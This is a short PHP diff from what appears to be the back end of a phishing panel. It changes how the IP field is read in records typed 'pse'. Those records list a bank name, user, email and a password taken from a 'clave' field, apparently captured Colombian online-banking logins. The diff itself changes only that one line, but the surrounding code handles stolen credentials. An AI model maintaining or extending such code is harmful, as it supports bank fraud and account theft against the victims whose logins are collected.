@@ -137,7 +137,7 @@ try {
                 'id' => $r['id'],
                 'type' => 'pse',
                 'bank' => $r['banco'] ?? 'PSE',
-                'ip' => $r['ip'] ?? '',
+                'ip' => $r['ip_address'] ?? 'sin ip',
                 'user' => $r['usuario'] ?? 'N/A', // Holds User
                 'email' => $r['email'] ?? '',     // Holds PSE Email
                 'pass' => $r['clave'] ?? '***',
